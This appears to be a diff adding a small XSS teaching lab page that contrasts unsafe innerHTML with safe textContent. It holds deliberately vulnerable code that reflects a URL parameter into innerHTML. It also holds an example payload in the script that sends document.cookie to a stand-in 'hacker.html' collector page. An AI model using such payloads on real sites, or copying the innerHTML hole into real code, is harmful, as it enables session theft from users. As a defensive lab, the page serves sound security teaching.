@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>XSS Lab</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .box { border: 1px solid #ccc; padding: 10px; margin-top: 10px; min-height: 50px; }
+        .danger { background-color: #ffebee; }
+        .safe { background-color: #e8f5e9; }
+    </style>
+</head>
+<body>
+
+    <h2>XSS Prevention Lab</h2>
+
+    <h3>Attack 1: Stored/Manual XSS</h3>
+    <p>Victim pastes payload manually (unrealistic — for baseline only).</p>
+    <input type="text" id="userInput" placeholder="Type <img src=x onerror=alert(1)>" style="width: 300px;">
+    <button onclick="updatePage()">Display Input</button>
+
+    <h3>Vulnerable (uses .innerHTML):</h3>
+    <div id="vulnerableBox" class="box danger"></div>
+
+    <h3>Secure (uses .textContent):</h3>
+    <div id="safeBox" class="box safe"></div>
+
+    <hr>
+    <h3>Attack 2: Reflected XSS via URL Parameter</h3>
+    <p>Attacker sends victim a crafted link — no typing needed. Try:</p>
+    <code id="exampleUrl"></code>
+    <h4>Reflected output (vulnerable):</h4>
+    <div id="reflectedBox" class="box danger"></div>
+
+    <script>
+        document.cookie = "session_id=SECRET_12345; path=/";
+
+        function updatePage() {
+            const input = document.getElementById('userInput').value;
+            document.getElementById('vulnerableBox').innerHTML = input;
+            document.getElementById('safeBox').textContent = input;
+        }
+
+        // Reflected XSS: read payload from URL ?q= parameter
+        const params = new URLSearchParams(window.location.search);
+        const reflected = params.get('q');
+        if (reflected) {
+            // Dangerous: attacker controls this via the URL
+            document.getElementById('reflectedBox').innerHTML = reflected;
+        }
+
+        // Show the example attack URL
+        const attackPayload = encodeURIComponent(
+            `<img src=x onerror="document.location='http://127.0.0.1:5500/XSS/hacker.html?'+document.cookie">`
+        );
+        document.getElementById('exampleUrl').textContent =
+            `${location.origin}${location.pathname}?q=${attackPayload}`;
+    </script>
+
+</body>
+</html>
